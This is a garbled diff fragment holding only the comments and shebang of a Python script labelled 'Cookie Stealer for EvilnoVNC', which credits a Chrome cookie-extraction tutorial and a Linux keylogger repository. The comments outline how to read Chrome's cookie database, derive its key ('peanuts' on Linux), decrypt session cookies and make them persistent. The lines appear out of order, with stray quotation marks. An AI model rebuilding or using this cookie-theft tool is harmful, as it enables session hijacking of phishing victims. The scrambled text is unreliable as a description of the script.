@@ -1,0 +1,30 @@
+            # already decrypted
+        # and make session cookie persistent
+        # update the cookies table with the decrypted value
+    # 1003 on Mac, 1 on Linux"
+    # Default values used by both Chrome and Chromium in OSX and Linux"
+    # FROM cookies
+    # Function to get rid of padding
+    # On Mac, replace MY_PASS with your password from Keychain"
+    # Trim off the 'v10' that Chrome/ium prepends"
+    # close connection
+    # commit changes
+    # connect to the database
+    # get the AES key
+    # get the cookies from `cookies` table
+    # ignore decoding errors
+    # local sqlite Chrome cookie database path
+"
+"       # File does not exist, or no permissions."
+"    # On Linux, replace MY_PASS with 'peanuts'"
+"    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value"
+"    # WHERE host_key like '%thepythoncode.com%'"""""")"
+"    # cursor.execute("""""""
+"    # you can also search by domain, e.g thepythoncode.com"
+"    #filename = ""/home/user/.config/chromium/Default/Cookies"""
+"    #filename = ""Downloads/Default/Cookies"""
+# Code from: https://www.thepythoncode.com/article/extract-chrome-cookies-python
+# Cookie Stealer for EvilnoVNC
+# Decrypt function from: https://n8henrie.com/2014/05/decrypt-chrome-cookies-with-python
+# From: https://github.com/nandydark/Linux-keylogger
+#!/usr/bin/python3
